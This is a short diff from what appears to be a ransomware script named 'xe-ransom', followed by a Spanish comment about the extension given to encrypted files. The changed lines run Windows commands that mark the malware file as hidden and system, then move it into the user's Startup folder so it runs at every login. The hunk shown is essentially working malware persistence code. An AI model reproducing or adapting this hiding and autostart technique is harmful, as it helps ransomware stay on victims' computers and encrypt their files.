@@ -4,9 +4,9 @@ import time
 
 
 
-os.system('attrib +s +h C:\Users\Aaron\Downloads\xe-ransom.exe')
+os.system('attrib +s +h C:\Users\Aaron\Downloads\xe-ransom.py')
 
-os.system('MOVE C:\Users\Aaron\Downloads\xe-ransom.exe C:\Users\Aaron\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+os.system('MOVE C:\Users\Aaron\Downloads\xe-ransom.py C:\Users\Aaron\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 
 
 # Extensión para los archivos encriptados.
